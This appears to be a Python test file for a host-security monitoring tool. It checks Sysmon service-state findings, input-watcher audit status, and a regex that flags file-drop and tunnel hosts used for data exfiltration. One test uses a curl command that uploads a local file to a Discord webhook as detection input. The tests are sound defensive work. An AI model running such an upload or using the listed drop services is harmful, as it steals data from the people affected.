"""A sensor that stops must never read as a clean, complete run (2026-10-27 audit).

Measured live: the keyboard-hook audit timed out on a 70 MB trace while every
`input` run was recorded complete with a low note; Sysmon's service state was
read but never judged, and on the native-sensor path never even asked.
"""
import unittest
from unittest import mock

from jarvis.collectors.host.inputwatch import watchers
from jarvis.collectors.telemetry import sysmon
from jarvis.core import collection


class SysmonServiceTests(unittest.TestCase):
    def judge(self, st):
        with collection.observe() as obs:
            out = sysmon._service_findings(st)
        return out, obs

    def test_stopped_service_is_high_and_a_coverage_failure(self):
        out, obs = self.judge({"installed": True, "state": "Stopped", "enabled": "True"})
        self.assertEqual([(f["severity"], f["title"]) for f in out],
                         [("high", "Sysmon is installed but not running")])
        self.assertIn("sysmon-service", obs.error)
        self.assertIn("T1562.001", out[0]["detail"])

    def test_disabled_channel_is_high(self):
        out, obs = self.judge({"installed": True, "state": "Running", "enabled": "False"})
        self.assertEqual([f["title"] for f in out], ["Sysmon's event log channel is disabled"])
        self.assertIn("sysmon-channel", obs.error)

    def test_running_and_enabled_is_silent(self):
        out, obs = self.judge({"installed": True, "state": "Running", "enabled": "True"})
        self.assertEqual(out, [])
        self.assertEqual(obs.error, "")

    def test_no_answer_judges_nothing(self):
        # Interop down: no claim either way, and never "running".
        for st in ({}, None, {"installed": True, "state": ""}):
            out, obs = self.judge(st)
            self.assertEqual(out, [], st)
            self.assertEqual(obs.error, "", st)

    def test_native_path_reports_a_stopped_service_without_skipping_events(self):
        import os
        import tempfile

        from jarvis.core.store import Store
        events = {"events": [], "complete": True, "rareComplete": True}
        with tempfile.TemporaryDirectory() as d:
            store = Store(os.path.join(d, "j.db"))
            store.set_meta("sysmon_thread_rules", sysmon.THREAD_RULES)
            try:
                with mock.patch.object(sysmon, "_native", return_value=(events, None)), \
                        mock.patch.object(sysmon, "status",
                                          return_value={"installed": True, "state": "Stopped"}), \
                        mock.patch.object(sysmon, "_fetch",
                                          side_effect=AssertionError("fallback query used")):
                    out = sysmon.audit(store, hosts=("win",), incremental=True)
            finally:
                store.close()
        self.assertIn("Sysmon is installed but not running", [f["title"] for f in out])


class InputAuditTests(unittest.TestCase):
    def test_failed_broker_audit_makes_the_run_partial_at_medium(self):
        with collection.observe() as obs:
            collection.succeeded("input-hook")        # the rest of the job worked
            out = watchers.audit(result=(None, "the broker's last inputaudit run failed: "
                                               "timed out after 120s"))
        self.assertEqual(obs.status, "partial")
        self.assertIn("inputaudit", obs.error)
        self.assertEqual([(f["severity"], f["title"]) for f in out],
                         [("medium", "input watcher audit unavailable")])

    def test_a_good_audit_is_a_success(self):
        with collection.observe() as obs:
            watchers.audit(result=({"watchers": [], "boot": 0, "session_started": 0}, ""),
                           clock=1767225700)
        self.assertEqual(obs.status, "complete")



class DeadDropTests(unittest.TestCase):
    def test_patterns_are_host_names_because_the_dns_cache_has_no_paths(self):
        from jarvis.collectors.process import evasion
        self.assertNotIn("/", evasion.DEAD_DROP.pattern)

    def test_dns_names_that_must_and_must_not_match(self):
        from jarvis.collectors.process import evasion
        for name in ("pastebin.com", "api.telegram.org", "abc.ngrok-free.app",
                     "x.trycloudflare.com", "transfer.sh"):
            self.assertTrue(evasion.DEAD_DROP.search(name), name)
        for name in ("discord.com", "cdn.discordapp.com", "github.com", "telegram.org"):
            self.assertFalse(evasion.DEAD_DROP.search(name), name)

    def test_discord_webhooks_stay_covered_where_the_url_is_visible(self):
        from jarvis.collectors.telemetry import techniques
        hits = techniques.match(r"C:\Windows\System32\curl.exe",
                                r"curl -X POST -d @C:\t\k.txt https://discord.com/api/webhooks/1/a",
                                "win")
        self.assertIn("upload to a file-drop or chat webhook service",
                      [rule.title for rule, _span in hits])


if __name__ == "__main__":
    unittest.main()
